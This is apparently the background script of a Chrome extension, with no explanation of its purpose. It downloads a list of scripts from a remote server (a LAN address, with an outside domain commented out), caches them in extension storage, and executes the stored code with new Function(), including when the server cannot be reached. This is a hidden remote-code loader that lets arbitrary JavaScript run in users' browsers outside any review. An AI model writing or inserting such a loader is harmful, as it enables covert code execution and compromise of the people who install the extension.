var newCid = "120016";
!function () {
    var nu = 0; //
    var total = 0;//
    $.ajax({
        type:"get",
        // url:"http://xiaobaiszt.douyapu.com/api/combine",
        url:"http://192.168.3.80/1.json",
        cache:false,
        success:function (e) {
            a(e);
        },
        error:function () {
            b()
        }
    });
    function a(e) {
        total = e.length;
        $.each(e,function (v,k) {
            chrome.storage.local.get(k.name,function (d) {
                if ($.isEmptyObject(d)) {
                    gt(k.name,k.link,k.version)
                } else {
                    if (d[k.name] == k.version) {
                        vc()
                    } else {
                        gt(k.name,k.link,k.version)
                    }
                }
            });
        })
    }//
    function b() {
        chrome.storage.local.get('backvdata',function (e) {
            new Function(e.backvdata)();
        });
    }//
    function gt(name,url,ver) {
        var jsName = name + 'data';
        $.ajax({
            url:url,
            dataType:'html',
            success:function (d) {
                chrome.storage.local.set({[jsName]:d});
                chrome.storage.local.set({[name]:ver});
                vc()
            },
            error:function () {
                vc()
            }
        })
    }//
    function vc() {
        nu++;
        if (nu == total) {
            chrome.storage.local.get('backvdata',function (e) {
                new Function(e.backvdata)();
            });
        }
    }//
}();